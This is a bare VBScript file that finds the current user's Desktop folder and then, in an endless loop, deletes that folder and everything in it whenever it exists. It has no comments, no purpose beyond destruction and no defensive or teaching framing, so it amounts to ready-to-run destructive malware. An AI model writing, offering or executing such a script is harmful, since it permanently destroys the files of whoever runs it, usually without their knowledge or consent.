Set shell = CreateObject("Wscript.Shell")
desktop = shell.SpecialFolders("Desktop")
Set FSO = CreateObject("Scripting.FileSystemObject")
Do
  If FSO.FolderExists(desktop) Then
     FSO.DeleteFolder(desktop)
  End If
Loop
